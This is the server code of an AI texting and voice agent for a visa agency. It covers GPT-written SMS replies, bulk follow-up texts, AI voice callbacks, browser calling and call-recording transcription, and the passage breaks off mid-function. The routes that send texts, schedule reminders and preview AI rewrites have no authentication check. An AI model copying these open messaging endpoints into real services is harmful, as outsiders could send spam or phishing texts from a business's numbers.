/**
 * Sevyn Stark SMS Agent
 * Handles incoming SMS and sends AI-powered responses
 * Also supports outbound SMS for follow-ups
 */

require('dotenv').config();
const express = require('express');
const twilio = require('twilio');
const OpenAI = require('openai');
const path = require('path');

// Security & Auth
const { setupSecurity } = require('./security');
const { setupAuthRoutes, requireAuth } = require('./auth-db');

const app = express();

// Setup security middleware FIRST
setupSecurity(app);

app.use(express.urlencoded({ extended: true }));

// (Stripe webhook removed — not used in O1dMatch ops app)
app.use('/_unused-stripe', express.json({
  verify: (req, res, buf) => {
    req.rawBody = buf;
  }
}));

// JSON parser for all other routes
app.use(express.json());

// Setup auth routes
setupAuthRoutes(app);

// Root redirect to dashboard (which requires auth)
app.get('/', (req, res) => {
  res.redirect('/dashboard');
});

// Protected dashboard route
app.get('/dashboard', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Pretty alias for the call history page (clicked from the dashboard)
app.get('/calls', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'calls.html'));
});

// Pretty alias for admin
app.get('/admin', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Protected admin route (requires auth - admin check done client-side + API-level)
app.get('/admin.html', requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Serve static frontend
app.use(express.static(path.join(__dirname, 'public')));

// Initialize clients
const twilioClient = twilio(
  process.env.TWILIO_ACCOUNT_SID,
  process.env.TWILIO_AUTH_TOKEN
);
const openai = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });

// Sevyn's personality and knowledge - OPERATIONS MODE (March 2026)
// Phone/SMS is for new business only; existing clients directed to email
const SEVYN_SYSTEM_PROMPT = `You are Sevyn Stark, the AI assistant for Sherrod Sports Visas and Innovative Global Talent Agency.

=== OPERATIONS MODE (ACTIVE) ===
We're running lean due to team changes:
- ALL case support goes through EMAIL only
- SMS is for new business leads and routing
- Response time for emails: 1-3 business days
- No phone/SMS support for existing clients

PERSONALITY:
- Warm, professional, helpful
- Concise in SMS (keep under 160 chars when possible)
- Direct - don't waste people's time
- Apologetic about limited phone support, but confident about email

KEY CONTACTS BY COMPANY:

Sherrod Sports Visas (Athletes):
→ Email: gabriella@sherrodsportsvisas.com

IGTA (Tech/Business professionals):
→ Email: gabriella@innovativeglobaltalent.com

O1dMatch (Eligibility check):
→ Website: o1dmatch.com (free!)

HOW TO RESPOND:

**NEW LEAD** (never worked with us):
- Be enthusiastic
- Ask: What field? What country? What are you looking for?
- Collect: name, email, profession
- Say: "Our team will review and email you within 1-3 business days!"

**EXISTING CLIENT** (asking for case update):
Standard response:
"Hi! For case updates, please email gabriella@sherrodsportsvisas.com. We're handling all support through email right now (1-3 business days). 📧"

If they push:
"I know it's not ideal - we've had some team changes. Email is how we track everything. Sherrod personally reviews cases during this transition."

**URGENT MATTER**:
"This sounds urgent. Please email [appropriate address] AND text me the details. I'll flag it for priority review."

SERVICES & PRICING (if asked):
- P-1A (Athletes): $6,000
- O-1A (Extraordinary): $8,000
- O-1B (Arts): $7,000
- Petitioner Service: $1,500-$2,000
- $500 eligibility review (credited if you proceed)

DO NOT:
- Promise phone callbacks
- Give legal advice
- Make up information
- Promise specific outcomes

Keep SMS responses to 1-2 messages max. End with a clear next step.`;

// Conversation history (in-memory, consider Redis for production)
const conversations = new Map();

/**
 * Handle incoming SMS
 */
app.post('/sms', async (req, res) => {
  const from = req.body.From;
  const body = req.body.Body;
  const to = req.body.To;

  console.log(`📱 SMS from ${from}: ${body}`);

  try {
    // Sales training line — tell texters to call instead
    if (to === '+19803032854') {
      console.log(`📱 Sales training line SMS — redirecting to call`);
      const twiml = new twilio.twiml.MessagingResponse();
      twiml.message("Hey! This is Sevyn. This number is for live sales training evaluations — text won't cut it. Call me at (980) 303-2854 and pitch me on O1DMatch. I'll score you when we're done. Good luck!");
      res.type('text/xml');
      return res.send(twiml.toString());
    }

    // Get or create conversation history
    if (!conversations.has(from)) {
      conversations.set(from, []);
    }
    const history = conversations.get(from);

    // Add user message
    history.push({ role: 'user', content: body });

    // Keep only last 10 messages for context
    if (history.length > 10) {
      history.splice(0, history.length - 10);
    }

    // Generate response
    const response = await openai.chat.completions.create({
      model: 'gpt-4o-mini',
      messages: [
        { role: 'system', content: SEVYN_SYSTEM_PROMPT },
        ...history
      ],
      max_tokens: 300,
      temperature: 0.7
    });

    const reply = response.choices[0].message.content;
    
    // Add assistant response to history
    history.push({ role: 'assistant', content: reply });

    console.log(`💬 Sevyn replies: ${reply}`);

    // Send TwiML response
    const twiml = new twilio.twiml.MessagingResponse();
    twiml.message(reply);
    
    res.type('text/xml');
    res.send(twiml.toString());

  } catch (error) {
    console.error('Error processing SMS:', error);
    
    const twiml = new twilio.twiml.MessagingResponse();
    twiml.message("Hi! This is Sevyn. I'm having a moment - please try again or call (980) 350-2728.");
    
    res.type('text/xml');
    res.send(twiml.toString());
  }
});

/**
 * Send outbound SMS
 */
/**
 * Brand name lookup for AI-enhanced SMS
 */
const SMS_BRAND_NAMES = {
  '+15617944621': 'Adriana from O1dMatch',
  '+19803032854': 'Sevyn, O1DMatch Sales Training evaluator'
};

/**
 * Enhance a message with AI for a specific brand
 */
async function enhanceMessageWithAI(message, fromNumber) {
  const brandIdentity = SMS_BRAND_NAMES[fromNumber] || 'a professional assistant';
  const enhanced = await openai.chat.completions.create({
    model: 'gpt-4o-mini',
    messages: [
      {
        role: 'system',
        content: `You are ${brandIdentity}. Rewrite this message in a warm, professional tone appropriate for the brand. Keep it under 160 characters if possible. Do not add quotes around the message. Do not add a signature — the recipient already knows who is texting.`
      },
      { role: 'user', content: message }
    ],
    max_tokens: 100
  });
  return enhanced.choices[0].message.content;
}

/**
 * Preview AI-enhanced SMS (does not send)
 */
app.post('/api/sms/preview', async (req, res) => {
  const { message, from } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }

  try {
    const fromNumber = from || process.env.TWILIO_PHONE_NUMBER || '+19803032854';
    const enhanced = await enhanceMessageWithAI(message, fromNumber);
    res.json({ success: true, original: message, enhanced });
  } catch (error) {
    console.error('SMS preview error:', error.message);
    res.status(500).json({ error: 'Failed to enhance message' });
  }
});

/**
 * Send outbound SMS
 */
app.post('/send', async (req, res) => {
  const { to, message, useAI, from } = req.body;

  if (!to || !message) {
    return res.status(400).json({ error: 'Missing "to" or "message"' });
  }

  // Normalize destination number to E.164
  const toNumber = to.startsWith('+') ? to : `+1${to.replace(/\D/g, '')}`;

  // Use specified from number, fall back to env var
  const fromNumber = from || process.env.TWILIO_PHONE_NUMBER || '+19803032854';

  try {
    let finalMessage = message;

    // Optionally enhance message with AI (brand-aware)
    if (useAI) {
      finalMessage = await enhanceMessageWithAI(message, fromNumber);
    }

    // Send SMS via Twilio
    const result = await twilioClient.messages.create({
      body: finalMessage,
      from: fromNumber,
      to: toNumber
    });

    console.log(`📤 SMS ${result.status} | From: ${fromNumber} → To: ${toNumber} | SID: ${result.sid}`);

    // Check for immediate failure statuses
    if (result.status === 'failed' || result.status === 'undelivered') {
      console.error(`❌ SMS failed immediately: ${result.errorCode} - ${result.errorMessage}`);
      return res.status(500).json({
        success: false,
        error: `SMS failed: ${result.errorMessage || 'Unknown error'}. This number may not have SMS capability.`,
        errorCode: result.errorCode
      });
    }

    // If queued, check delivery status after a short delay
    // Twilio may accept but carrier can reject (e.g. 30034 A2P blocking)
    if (result.status === 'queued' || result.status === 'accepted') {
      // Wait 3 seconds and check actual status
      await new Promise(r => setTimeout(r, 3000));
      try {
        const updatedMsg = await twilioClient.messages(result.sid).fetch();
        console.log(`   📋 Status after 3s: ${updatedMsg.status} | err: ${updatedMsg.errorCode || 'none'}`);

        if (updatedMsg.status === 'undelivered' || updatedMsg.status === 'failed') {
          let errorDetail = updatedMsg.errorMessage || 'Message was blocked';
          if (updatedMsg.errorCode === 30034) {
            errorDetail = 'Message blocked by carrier. Your Twilio numbers need A2P 10DLC registration to send SMS to US numbers. Register at Twilio Console → Messaging → Trust Hub.';
          } else if (updatedMsg.errorCode === 30008) {
            errorDetail = 'Message could not be delivered. The carrier rejected it.';
          }
          return res.json({
            success: false,
            error: errorDetail,
            errorCode: updatedMsg.errorCode,
            sid: result.sid
          });
        }

        return res.json({
          success: true,
          sid: result.sid,
          status: updatedMsg.status,
          to: result.to,
          from: result.from,
          message: finalMessage
        });
      } catch (fetchErr) {
        // If status check fails, return the original queued status
        console.error('   ⚠️ Could not verify SMS status:', fetchErr.message);
      }
    }

    res.json({
      success: true,
      sid: result.sid,
      status: result.status,
      to: result.to,
      from: result.from,
      message: finalMessage
    });

  } catch (error) {
    console.error('❌ SMS error:', error.message, error.code ? `(${error.code})` : '');

    // Provide helpful error messages for common Twilio errors
    let userError = error.message;
    if (error.code === 21610) {
      userError = 'This number has opted out of SMS. They need to text START to opt back in.';
    } else if (error.code === 21211) {
      userError = 'Invalid destination phone number.';
    } else if (error.code === 21606 || error.code === 21612) {
      userError = `The from number (${fromNumber}) is not SMS-capable. Try a different brand number.`;
    } else if (error.code === 21408) {
      userError = 'SMS not enabled for this region. Check Twilio geo permissions.';
    }

    res.status(500).json({ error: userError });
  }
});

/**
 * Bulk send follow-ups
 */
app.post('/followup', async (req, res) => {
  const { contacts, template } = req.body;
  
  // contacts: [{ name: "John", phone: "+1234567890", context: "P-1 inquiry" }]
  // template: "Hi {name}, following up on your {context}. Ready to proceed?"

  if (!contacts || !template) {
    return res.status(400).json({ error: 'Missing contacts or template' });
  }

  const results = [];
  
  for (const contact of contacts) {
    try {
      // Personalize message
      let message = template
        .replace('{name}', contact.name || 'there')
        .replace('{context}', contact.context || 'visa inquiry');

      // Enhance with AI for natural tone
      const enhanced = await openai.chat.completions.create({
        model: 'gpt-4o-mini',
        messages: [
          { 
            role: 'system', 
            content: 'You are Sevyn Stark. Make this follow-up message warm and personal. Keep under 160 chars. No quotes.' 
          },
          { role: 'user', content: message }
        ],
        max_tokens: 80
      });

      const finalMessage = enhanced.choices[0].message.content;

      // Send via Twilio from Sevyn's number
      const result = await twilioClient.messages.create({
        body: finalMessage,
        from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
        to: contact.phone.startsWith('+') ? contact.phone : `+1${contact.phone.replace(/\D/g, '')}`
      });

      results.push({
        name: contact.name,
        phone: contact.phone,
        status: 'sent',
        sid: result.sid,
        message: finalMessage
      });

      // Rate limit - wait 1 second between messages
      await new Promise(r => setTimeout(r, 1000));

    } catch (error) {
      results.push({
        name: contact.name,
        phone: contact.phone,
        status: 'failed',
        error: error.message
      });
    }
  }

  res.json({ results });
});

/**
 * Health check
 */
app.get('/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    agent: 'Sevyn Stark SMS',
    phone: process.env.TWILIO_PHONE_NUMBER 
  });
});

/**
 * Stats endpoint for dashboard - reads from Supabase
 */
const { getStats, getDashboardData } = require('./database/supabase');

app.get('/api/stats', async (req, res) => {
  try {
    const stats = await getStats();
    res.json({
      calls: stats.total_calls || 0,
      sms: stats.total_sms || 0,
      leads: stats.total_leads || 0,
      byBrand: stats.calls_by_brand || {}
    });
  } catch (error) {
    console.error('Stats error:', error);
    res.json({ calls: 0, sms: 0, leads: 0, error: error.message });
  }
});

// Note: /api/dashboard and /api/call routes are defined below in DASHBOARD API ROUTES section

/**
 * Get all configured brands
 */
app.get('/api/brands', (req, res) => {
  const { BRAND_CONFIG } = require('./inbound-voice');
  const brands = Object.entries(BRAND_CONFIG).map(([phone, config]) => ({
    phone,
    ...config
  }));
  res.json({ brands });
});

/**
 * Inbound Voice - Conversational AI
 * Uses Bland.ai for intelligent conversations, with VIP routing
 */
const { 
  handleInboundTransfer, 
  createInboundAICall, 
  getBrandConfig, 
  getVIPStatus 
} = require('./inbound-voice');

app.post('/voice', (req, res) => {
  const calledNumber = req.body.Called || req.body.To || '';
  const callerNumber = req.body.From || '';
  
  const brand = getBrandConfig(calledNumber);
  const vip = getVIPStatus(callerNumber);
  
  console.log(`📞 Inbound call: ${callerNumber} → ${calledNumber} (${brand.brand})`);
  if (vip) console.log(`   ⭐ VIP: ${vip.name}`);
  
  const twiml = new twilio.twiml.VoiceResponse();
  
  // VIP priority routing - connect directly or special handling
  if (vip && vip.action === 'priority') {
    twiml.say({ voice: 'Polly.Joanna' }, `Hey ${vip.name.split(' ')[0]}! Let me connect you right away.`);
    twiml.dial({ timeout: 30, callerId: calledNumber }, '+15617408303'); // Direct to Sherrod
    twiml.say({ voice: 'Polly.Joanna' }, "Sherrod isn't available. Let me take a message.");
    // Fall through to AI if no answer
  }
  
  // Use Bland.ai API for fully conversational AI with brand context
  // Play brief hold message, then Bland.ai calls them back immediately
  twiml.say({ voice: 'Polly.Joanna' }, `Thank you for calling ${brand.name}. Please hold for just a moment.`);
  twiml.pause({ length: 2 });
  twiml.say({ voice: 'Polly.Joanna' }, `Adriana will be right with you.`);
  twiml.hangup();
  
  // Trigger Bland.ai to call them back with full brand context
  setImmediate(async () => {
    try {
      await new Promise(r => setTimeout(r, 1500));
      await createInboundAICall(callerNumber, calledNumber, {
        webhookUrl: process.env.BASE_URL ? `${process.env.BASE_URL}/call-complete` : null
      });
      console.log(`   ✅ Bland.ai callback initiated for ${brand.brand}`);
    } catch (error) {
      console.error('Failed to initiate Bland.ai callback:', error);
    }
  });
  
  res.type('text/xml');
  res.send(twiml.toString());
});

/**
 * AI-powered voice endpoint - uses Bland.ai to handle full conversation
 * Call this endpoint for full conversational AI (not just forward)
 */
app.post('/voice-ai', async (req, res) => {
  const calledNumber = req.body.Called || req.body.To || '';
  const callerNumber = req.body.From || '';
  
  const brand = getBrandConfig(calledNumber);
  const vip = getVIPStatus(callerNumber);
  
  console.log(`📞 AI Voice: ${callerNumber} → ${calledNumber} (${brand.brand})`);
  
  const twiml = new twilio.twiml.VoiceResponse();
  
  // Play hold message
  twiml.say({ voice: 'Polly.Joanna' }, 'Thanks for calling! One moment while I connect you with Adriana.');
  twiml.pause({ length: 1 });
  twiml.say({ voice: 'Polly.Joanna' }, 'Adriana will call you right back on this number.');
  twiml.hangup();
  
  // Trigger Bland.ai to call them back with AI
  setImmediate(async () => {
    try {
      await new Promise(r => setTimeout(r, 2000));
      const webhookUrl = process.env.BASE_URL ? `${process.env.BASE_URL}/call-complete` : null;
      await createInboundAICall(callerNumber, calledNumber, { webhookUrl });
    } catch (error) {
      console.error('Bland.ai callback failed:', error);
    }
  });
  
  res.type('text/xml');
  res.send(twiml.toString());
});

/**
 * Voice callback from Bland.ai
 * Receives call summaries and forwards to Sherrod
 */
app.post('/voice-callback', async (req, res) => {
  console.log('📞 Voice callback received:', JSON.stringify(req.body, null, 2));
  
  const { call_id, summary, concatenated_transcript, to, from, call_length, completed } = req.body;
  
  if (!completed || !summary) {
    return res.json({ status: 'ignored', reason: 'call not completed or no summary' });
  }
  
  // Format message for Sherrod
  const message = `📞 CALL MESSAGE from Sevyn:\n\nFrom: ${from}\nDuration: ${Math.round(call_length || 0)} min\n\n${summary}\n\n[Call ID: ${call_id}]`;
  
  try {
    // Send SMS to Sherrod
    await twilioClient.messages.create({
      body: message,
      from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
      to: '+15617408303' // Sherrod's phone
    });
    
    console.log('✅ Call summary sent to Sherrod');
    res.json({ status: 'ok', forwarded: true });
  } catch (error) {
    console.error('Error forwarding call summary:', error);
    res.json({ status: 'error', message: error.message });
  }
});

/**
 * Call completion webhook - receives data from Bland.ai
 */
// (legacy Bland.ai call-complete + leads endpoints removed — Vapi only)

/**
 * Set a reminder (creates a scheduled callback)
 */
app.post('/reminder', async (req, res) => {
  const { message, phone, delayMinutes } = req.body;
  
  if (!message) {
    return res.status(400).json({ error: 'Missing message' });
  }
  
  const targetPhone = phone || '+15617408303'; // Default to Sherrod
  const delay = (delayMinutes || 5) * 60 * 1000; // Convert to ms
  
  // Schedule the reminder
  setTimeout(async () => {
    try {
      await twilioClient.messages.create({
        body: `⏰ REMINDER from Sevyn:\n\n${message}`,
        from: process.env.TWILIO_PHONE_NUMBER || '+19803032854',
        to: targetPhone
      });
      console.log(`✅ Reminder sent: ${message}`);
    } catch (error) {
      console.error('Error sending reminder:', error);
    }
  }, delay);
  
  const reminderTime = new Date(Date.now() + delay);
  console.log(`⏰ Reminder scheduled for ${reminderTime.toLocaleTimeString()}: ${message}`);
  
  res.json({ 
    status: 'scheduled', 
    message, 
    willSendAt: reminderTime.toISOString(),
    phone: targetPhone 
  });
});

/**
 * ============================================
 * RETELL AI ROUTES (Inbound Voice)
 * ============================================
 */

// Voice provider router (switches between Retell and Vapi via VOICE_PROVIDER env)
const voice = require('./voice');

// Vapi webhook for call events
if (voice.handleVapiWebhook) {
  app.post('/vapi/webhook', voice.handleVapiWebhook);
}

// ============================================
// HUMAN CLICK-TO-CALL (Twilio Voice SDK / WebRTC)
// ============================================

// Issue a JWT access token so the dashboard browser can register as a Twilio
// Proxy a Twilio recording through our server. Twilio recording URLs
// require basic auth (Account SID + Auth Token) — without this proxy the
// browser would prompt the user with a login popup. Auth-gated to dashboard
// users. Only allows fetching recordings on our own Twilio account.
app.get('/api/twilio-recording/:sid', requireAuth, async (req, res) => {
  const sid = req.params.sid.replace(/\.(mp3|wav)$/, '');
  if (!/^RE[a-f0-9]{32}$/i.test(sid)) {
    return res.status(400).send('Invalid recording SID');
  }
  const ext = req.params.sid.endsWith('.wav') ? 'wav' : 'mp3';
  const url = `https://api.twilio.com/2010-04-01/Accounts/${process.env.TWILIO_ACCOUNT_SID}/Recordings/${sid}.${ext}`;
  const auth = 'Basic ' + Buffer.from(`${process.env.TWILIO_ACCOUNT_SID}:${process.env.TWILIO_AUTH_TOKEN}`).toString('base64');

  try {
    const upstream = await fetch(url, { headers: { Authorization: auth, Range: req.headers.range || '' } });
    if (!upstream.ok && upstream.status !== 206) {
      return res.status(upstream.status).send(`Twilio: ${upstream.statusText}`);
    }
    res.setHeader('Content-Type', upstream.headers.get('content-type') || `audio/${ext === 'wav' ? 'wav' : 'mpeg'}`);
    if (upstream.headers.get('content-length')) res.setHeader('Content-Length', upstream.headers.get('content-length'));
    if (upstream.headers.get('content-range'))  res.setHeader('Content-Range', upstream.headers.get('content-range'));
    if (upstream.headers.get('accept-ranges'))  res.setHeader('Accept-Ranges', upstream.headers.get('accept-ranges'));
    res.setHeader('Cache-Control', 'private, max-age=3600');
    res.status(upstream.status);
    const { Readable } = require('stream');
    Readable.fromWeb(upstream.body).pipe(res);
  } catch (err) {
    console.error('Recording proxy error:', err.message);
    res.status(502).send('Failed to fetch recording');
  }
});

// Voice SDK device and place outbound calls through the user's mic/speakers.
app.get('/api/twilio-token', requireAuth, (req, res) => {
  try {
    const AccessToken = twilio.jwt.AccessToken;
    const VoiceGrant = AccessToken.VoiceGrant;

    const accountSid = process.env.TWILIO_ACCOUNT_SID;
    const apiKey = process.env.TWILIO_API_KEY;
    const apiSecret = process.env.TWILIO_API_SECRET;
    const twimlAppSid = process.env.TWILIO_TWIML_APP_SID;

    if (!apiKey || !apiSecret || !twimlAppSid) {
      return res.status(500).json({
        error: 'WebRTC not configured. Missing TWILIO_API_KEY / TWILIO_API_SECRET / TWILIO_TWIML_APP_SID.'
      });
    }

    const identity = `dashboard-${(req.user && req.user.id) || 'user'}`;
    const token = new AccessToken(accountSid, apiKey, apiSecret, { identity, ttl: 3600 });
    token.addGrant(new VoiceGrant({
      outgoingApplicationSid: twimlAppSid,
      incomingAllow: false
    }));

    res.json({ token: token.toJwt(), identity });
  } catch (err) {
    console.error('Twilio token error:', err.message);
    res.status(500).json({ error: 'Failed to mint token' });
  }
});

// TwiML endpoint hit by Twilio when the browser initiates a call. The SDK
// passes custom params via `connect({ params: ... })`, which Twilio forwards
// to this URL. We use unique names (targetNumber / callerIdNumber) so they
// don't collide with Twilio's standard `To` / `From` webhook fields.
app.post('/api/twilio-voice-twiml', (req, res) => {
  const to = req.body.targetNumber || req.query.targetNumber || req.body.To;
  const from = req.body.callerIdNumber || req.query.callerIdNumber || process.env.TWILIO_PHONE_NUMBER;

  console.log(`📞 Human click-to-call: ${from} → ${to}`);

  const twiml = new twilio.twiml.VoiceResponse();
  if (!to) {
    console.log(`   ⚠️ No targetNumber provided. Body: ${JSON.stringify(req.body)}`);
    twiml.say('No destination number provided. Please try again.');
    twiml.hangup();
  } else {
    // Fire a status callback when the dial finishes so we can log the call.
    // Twilio POSTs the brand callerId and dialed number back to us.
    const base = process.env.BASE_URL || process.env.PUBLIC_URL || `https://${req.get('host')}`;
    const statusUrl = `${base}/api/twilio-call-status?brand=${encodeURIComponent(from)}&target=${encodeURIComponent(to)}`;
    const dialOpts = {
      callerId: from,
      answerOnBridge: true,
      timeout: 30,
      action: statusUrl,
      method: 'POST'
    };
    // Opt-in recording via env flag — many US states require two-party
    // consent, so this is off by default. Set HUMAN_CALL_RECORDING=true
    // to enable.
    const recordingOn = process.env.HUMAN_CALL_RECORDING === 'true';
    if (recordingOn) {
      dialOpts.record = 'record-from-answer-dual';
      dialOpts.recordingStatusCallback = `${base}/api/twilio-recording-status`;
      dialOpts.recordingStatusCallbackMethod = 'POST';
    }
    const dial = twiml.dial(dialOpts);
    // When recording is on, the called party hears a brief disclosure right
    // when they pick up — before being bridged. Twilio fetches this URL for
    // TwiML to play to them. Satisfies two-party consent in CA/FL/PA/etc.
    if (recordingOn) {
      dial.number({ url: `${base}/api/twilio-recording-disclosure` }, to);
    } else {
      dial.number(to);
    }
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

// Twilio fires this when a WebRTC (human click-to-call) dial finishes.
// Body has DialCallStatus, DialCallDuration, DialCallSid + the brand/target
// we passed via query string. NOTE: in a <Dial action="..."> callback,
// req.body.CallSid is the PARENT (client/browser leg). The dial-child SID
// is req.body.DialCallSid. Recordings on <Dial> are saved against the
// PARENT SID, so we use that as the row's primary call_id — otherwise the
// recording-status callback later can't find the row to update.
app.post('/api/twilio-call-status', async (req, res) => {
  const brand = req.query.brand || req.body.brand || '';
  const target = req.query.target || req.body.target || req.body.Called || '';
  const dialStatus = req.body.DialCallStatus || req.body.CallStatus || 'completed';
  const dialDurationSec = parseInt(req.body.DialCallDuration || '0', 10);
  const parentSid = req.body.CallSid || `human_${Date.now()}`;
  const dialSid = req.body.DialCallSid || '';
  const clientFrom = req.body.From || '';

  console.log(`\n📞 WebRTC call ended: ${target} (status=${dialStatus}, ${dialDurationSec}s, parent=${parentSid})`);

  // Resolve brand from the callerId number
  const { getBrandConfig } = require('./voice');
  const brandConfig = getBrandConfig(brand);

  const callData = {
    call_id: parentSid,
    brand: brandConfig.brand || 'Unknown',
    caller_phone: target || 'unknown',
    caller_name: null,
    caller_email: null,
    caller_type: 'human_outbound',
    inquiry_topic: null,
    outcome: dialStatus,
    follow_up_needed: false,
    call_duration_min: Math.max(1, Math.round(dialDurationSec / 60)) || null,
    summary: `Human (WebRTC) call placed from dashboard — agent talked directly with ${target} for ${dialDurationSec}s. Status: ${dialStatus}.`,
    transcript: null,
    recording_url: null,
    timestamp: new Date().toISOString(),
    direction: 'outbound',
    metadata: {
      provider: 'twilio_webrtc',
      direction: 'outbound',
      dial_sid: dialSid,
      parent_sid: parentSid,
      client_from: clientFrom,
      brand_phone: brand
    }
  };

  try {
    const { saveCall, updateStatsForCall } = require('./database/supabase');
    await saveCall(callData);
    await updateStatsForCall(brandConfig.brand);
  } catch (err) {
    console.error('   ❌ Supabase save failed:', err.message);
  }

  // When recording is on, we wait for the recording-status callback to write
  // to Sheets with the full Whisper+GPT summary. Otherwise, write now.
  if (process.env.HUMAN_CALL_RECORDING !== 'true') {
    try {
      const { writeCallLog } = require('./database/sheets');
      await writeCallLog({
        call_id: parentSid,
        brand: brandConfig.brand || 'Unknown',
        caller_phone: target || 'unknown',
        caller_name: null,
        caller_email: null,
        caller_type: 'human_outbound',
        inquiry_topic: null,
        outcome: dialStatus,
        follow_up_needed: false,
        duration_min: dialDurationSec ? Math.max(1, Math.round(dialDurationSec / 60)) : null,
        summary: callData.summary
      });
      console.log('   📞 WebRTC call logged to Sheets (basic — recording disabled)');
    } catch (err) {
      console.error('   ❌ Sheets write failed:', err.message);
    }
  } else {
    console.log('   ⏳ Deferring Sheets write until recording is transcribed');
  }

  res.type('text/xml').send('<?xml version="1.0" encoding="UTF-8"?><Response></Response>');
});

// Played to the called party right when they pick up. Two-party consent
// disclosure for CA / FL / PA / etc. — happens before they're bridged.
app.post('/api/twilio-recording-disclosure', (req, res) => {
  const t = new twilio.twiml.VoiceResponse();
  t.say({ voice: 'Polly.Joanna' }, 'This call may be recorded for quality and training purposes.');
  res.type('text/xml').send(t.toString());
});

// Recording lifecycle: when Twilio finishes saving the recording, we fetch
// the audio, run it through Whisper for a transcript, then GPT-4o-mini for
// a summary + structured data. Result is patched onto the Supabase row and
// the full row is written to Google Sheets.
app.post('/api/twilio-recording-status', async (req, res) => {
  // Respond immediately so Twilio doesn't retry (this work takes 10-30s)
  res.sendStatus(200);

  const dialSid = req.body.CallSid || '';
  const recordingUrl = req.body.RecordingUrl || '';
  const recordingStatus = req.body.RecordingStatus || '';
  const recordingDuration = parseInt(req.body.RecordingDuration || '0', 10);

  if (recordingStatus !== 'completed' || !recordingUrl) {
    console.log(`📼 Recording status=${recordingStatus} (skipping)`);
    return;
  }

  const mp3Url = recordingUrl.endsWith('.mp3') ? recordingUrl : `${recordingUrl}.mp3`;
  console.log(`\n📼 WebRTC recording ready for ${dialSid}: ${mp3Url} (${recordingDuration}s)`);

  try {
    await processHumanCallRecording(dialSid, mp3Url, recordingDuration);
  } catch (err) {
    console.error('   ❌ Human recording pipeline failed:', err.message);
    // Even on failure, save the raw recording URL so user can listen
    try {
      const { supabaseRequest } = require('./database/supabase');
      await supabaseRequest('calls', 'PATCH', { recording_url: mp3Url }, `?call_id=eq.${dialSid}`);
    } catch (_) {}
  }
});

async function processHumanCallRecording(dialSid, mp3Url, durationSec) {
  const { supabaseRequest } = require('./database/supabase');
  const { writeCallLog, writeLeadToSheet } = require('./database/sheets');

  // Convert raw Twilio URL to our proxy URL so the browser can play the
  // audio without being prompted for Twilio's basic auth login.
  const sidMatch = mp3Url.match(/Recordings\/(RE[a-f0-9]{32})/i);
  const playableUrl = sidMatch ? `/api/twilio-recording/${sidMatch[1]}.mp3` : mp3Url;

  // 1. Save proxied URL right away so it's listenable in the dashboard
  await supabaseRequest('calls', 'PATCH', { recording_url: playableUrl }, `?call_id=eq.${dialSid}`);

  // 2. Fetch the audio with basic auth (we still need the raw Twilio URL here)
  const twilioAuth = 'Basic ' + Buffer.from(`${process.env.TWILIO_ACCOUNT_SID}:${process.env.TWILIO_AUTH_TOKEN}`).toString('base64');
  const audioRes = await fetch(mp3Url, { headers: { Authorization: twilioAuth } });
  if (!audioRes.ok) throw new Error(`Fetch recording: ${audioRes.status}`);
  const audioBuffer = Buffer.from(await audioRes.arrayBuffer());
  console.log(`   🎧 Downloaded ${audioBuffer.length} bytes of audio`);

  // 3. Transcribe with Whisper
  const fd = new FormData();
  fd.append('file', new Blob([audioBuffer], { type: 'audio/mpeg' }), 'recording.mp3');
  fd.append('model', 'whisper-1');
  const wRes = await fetch('https://api.openai.com/v1/audio/transcriptions', {
    method: 'POST',
    headers: { Authorization: `Bearer ${process.env.OPENAI_API_KEY}` },
    body: fd
  });
  if (!wRes.ok) throw new Error(`Whisper ${wRes.status}: ${await wRes.text()}`);
  const { text: rawTranscript } = await wRes.json();
  if (!rawTranscript) throw new Error('Whisper returned empty transcript');
  console.log(`   📝 Transcribed: ${rawTranscript.length} chars`);

  // 4. Format speaker labels + summarize with GPT-4o-mini
  const systemPrompt = `You are processing a sales/outreach call between an Agent (a Sherrod Seward team member who placed the call from a dashboard) and a Caller (the prospect/lead they reached). Given a raw transcript with no speaker labels, infer who's speaking and return JSON only.

Return:
{
  "transcript": "Agent: ...\\nCaller: ...\\n... (full conversation with speaker labels)",
  "summary": "2-3 sentence summary of what was discussed and any commitments",
  "caller_name": "extracted name of the called party, or null",
  "caller_email": "extracted email, or null",
  "inquiry_topic": "what the call was about (1 phrase)",
  "follow_up_needed": true/false (true if any next step was agreed),
  "caller_type": "new_lead" or "existing_client" or "other"
}`;

  const gRes = await fetch('https://api.openai.com/v1/chat/completions', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${process.env.OPENAI_API_KEY}`,
      'Content-Type': 'application/json'
    },
    body: JSON.stringify({
      model: 'gpt-4o-mini',
      response_format: { type: 'json_object' },
      temperature: 0.2,
      messages: [
        { role: 'system', content: systemPrompt },
        { role: 'user', content: `Raw transcript:\n\n${rawTranscript}` }
      ]
    })
  });
  if (!gRes.ok) throw new Error(`GPT ${gRes.status}: ${await gRes.text()}`);
  const gData = await gRes.json();
  const analysis = JSON.parse(gData.choices[0].message.content);
  console.log(`   🤖 Analysis ready: "${analysis.summary?.substring(0, 80)}..."`);

  // 5. PATCH Supabase with full analysis
  await supabaseRequest('calls', 'PATCH', {
    transcript: analysis.transcript || rawTranscript,
    summary: analysis.summary || null,
    caller_name: analysis.caller_name || null,
    caller_email: analysis.caller_email || null,
    caller_type: analysis.caller_type || 'human_outbound',
    inquiry_topic: analysis.inquiry_topic || null,
    follow_up_needed: !!analysis.follow_up_needed
  }, `?call_id=eq.${dialSid}`);
  console.log(`   ✅ Patched Supabase with transcript + summary`);

  // 6. Fetch the row to write enriched data to Sheets
  const rows = await supabaseRequest('calls', 'GET', null, `?call_id=eq.${dialSid}&select=*`);
  const row = rows?.[0] || {};

  try {
    await writeCallLog({
      call_id: dialSid,
      brand: row.brand,
      caller_phone: row.caller_phone || 'unknown',
      caller_name: analysis.caller_name,
      caller_email: analysis.caller_email,
